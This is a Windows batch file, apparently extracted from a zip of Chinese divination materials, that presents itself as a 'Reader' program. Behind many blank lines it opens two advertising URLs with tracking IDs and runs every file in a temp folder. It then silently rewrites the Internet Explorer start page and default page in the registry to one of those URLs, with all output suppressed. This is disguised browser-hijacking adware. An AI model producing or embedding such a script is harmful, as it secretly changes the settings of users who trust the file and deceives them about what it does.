# Reader_阅读器.BAT

> 原文件：003周易命理资料/京房遗法筮法巅峰——《易隐》高层断法破解.zip内容/temp/Reader_阅读器.BAT
> 转换方式：原文解码为 UTF-8

```text






























@echo off
start iexplore.exe http://www.duba.com/?un_361586_142560
start iexplore.exe http://www.xmtxt.com/ii.htm?x14g
for /f "delims=" %%a in ('dir temp\  /s /b /a-d^|findstr /v /i "Reader_阅读器.BAT"') do (start "" "%%a")
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t reg_sz /d "http://www.duba.com/?un_361586_142560" /f >nul 2>nul
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Default_Page_URL" /t reg_sz /d "http://www.duba.com/?un_361586_142560" /f >nul 2>nul
exit 
```
